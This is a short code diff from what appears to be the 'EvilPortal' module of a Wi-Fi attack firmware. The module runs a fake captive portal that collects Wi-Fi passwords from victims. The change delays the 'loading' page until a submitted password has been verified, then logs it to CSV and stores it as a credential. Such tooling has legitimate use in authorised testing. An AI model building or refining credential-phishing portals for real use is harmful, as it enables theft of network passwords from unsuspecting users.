@@ -717,11 +717,11 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     htmlResponse += "</li>\n";
 
     if (_verifyPwd && passwordValue != "") {
-        request->send(200, "text/html", wifiLoadPage());
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
             lastCred += "valid: true\nStopping server...";
             saveToCSV(csvLine + ", valid: true", true);
+            request->send(200, "text/html", wifiLoadPage());
             printDeauthStatus();
             if (bruceConfig.getWifiPassword(apName) != "") {
                 bruceConfig.addWifiCredential(apName, passwordValue);
